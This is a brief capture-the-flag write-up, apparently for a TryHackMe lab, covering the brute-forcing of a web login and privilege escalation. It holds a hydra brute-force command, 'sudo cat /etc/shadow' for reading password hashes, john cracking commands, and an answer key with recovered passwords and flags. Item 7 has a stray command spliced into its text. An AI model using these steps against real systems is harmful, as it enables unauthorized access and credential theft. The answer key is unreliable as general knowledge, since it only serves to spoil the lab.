# Brute It-Bruteforce login pages&Sudo cat privilege escalation

```
export IP=10.10.212.108
```
```
user:admin
pass:xavier
```

# Material needed

1. Interesting directory: /admin

2. Bruteforce login page

```
hydra -l admin -P wordlist/rockyou.txt $IP http-post-form "/admin/index.php:user=admin&pass=^PASS^:Username or password invalid"
```

3. Privilege escalation

```
sudo cat /etc/shadow
```

4. crack password

```
unshadow passwd shadow > password
john --wordlist=/root/Documents/wordlist/rockyou.txt password
```

# Tasks

1. Search for open ports using nmap. How many ports are open? 2

2. What version of SSH is running? OpenSSH 7.6p1

3. What version of Apache is running? 2.4.29

4. Which Linux distribution is running? Ubuntu

5. Search for hidden directories on web server. What is the hidden directory? /admin

6. What is the user:password of the admin panel? admin:xavier

7. Crack the RSA key youunshadow passwd shadow > password found. What is John's RSA Private Key passphrase? rockinroll

8. user.txt

```
THM{a_password_is_not_a_barrier}
```

9. web flag

```
THM{brut3_f0rce_is_e4sy
```

10. What is the root's password? football

11. root.txt

```
THM{pr1v1l3g3_3sc4l4t10n}
```